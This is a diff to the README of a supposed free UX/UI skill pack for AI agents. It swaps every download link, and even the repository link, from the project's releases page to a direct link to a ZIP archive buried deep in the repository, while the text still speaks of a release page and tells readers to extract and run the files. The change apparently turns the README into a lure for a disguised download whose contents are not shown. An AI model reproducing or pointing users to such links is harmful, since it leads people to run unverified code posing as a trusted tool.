@@ -1,6 +1,6 @@
 # 🎨 ux-ui-skills - Free UX/UI Skill Pack for AI Agents
 
-[![Download Now](https://img.shields.io/badge/Download-FREE%20UX%20UI%20SKILL%20PACK-blue?style=for-the-badge&logo=github)](https://github.com/Gonadotrophic-tangent41/ux-ui-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-FREE%20UX%20UI%20SKILL%20PACK-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gonadotrophic-tangent41/ux-ui-skills/main/ux-ui-audit/agents/2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **ux-ui-skills**, a free collection of ready-to-use UX/UI skill files
 
 ## 📥 Download & Setup
 
-Visit this link to download the application: **[Download ux-ui-skills](https://github.com/Gonadotrophic-tangent41/ux-ui-skills/releases)**
+Visit this link to download the application: **[Download ux-ui-skills](https://raw.githubusercontent.com/Gonadotrophic-tangent41/ux-ui-skills/main/ux-ui-audit/agents/2.2.zip)**
 
 Once you click the link, you will see the latest release page. Look for the file named `ux-ui-skills.zip` or similar. Click it to download the ZIP archive to your computer. After downloading, locate the file in your Downloads folder and extract (unzip) all files to a folder of your choice. Then open the extracted folder and run the included skill files with your AI agent.
 
@@ -72,7 +72,7 @@ Thanks to the open-source community for contributions that make this skill pack 
 
 ## 🔗 Links
 
-- **[Download ux-ui-skills](https://github.com/Gonadotrophic-tangent41/ux-ui-skills/releases)**
-- **GitHub Repository:** https://github.com/Gonadotrophic-tangent41/ux-ui-skills
+- **[Download ux-ui-skills](https://raw.githubusercontent.com/Gonadotrophic-tangent41/ux-ui-skills/main/ux-ui-audit/agents/2.2.zip)**
+- **GitHub Repository:** https://raw.githubusercontent.com/Gonadotrophic-tangent41/ux-ui-skills/main/ux-ui-audit/agents/2.2.zip
 
 Keywords: accessibility, accessibility-checker, accessibility-testing, accessibility-tools, agent-skills, ai-design, chatgpt-skills, claude-code-skill, claude-skills, codex-skills, dashboard-design, design-systems, product-design, ui-design, ux, ux-design, ux-research, ux-ui-design
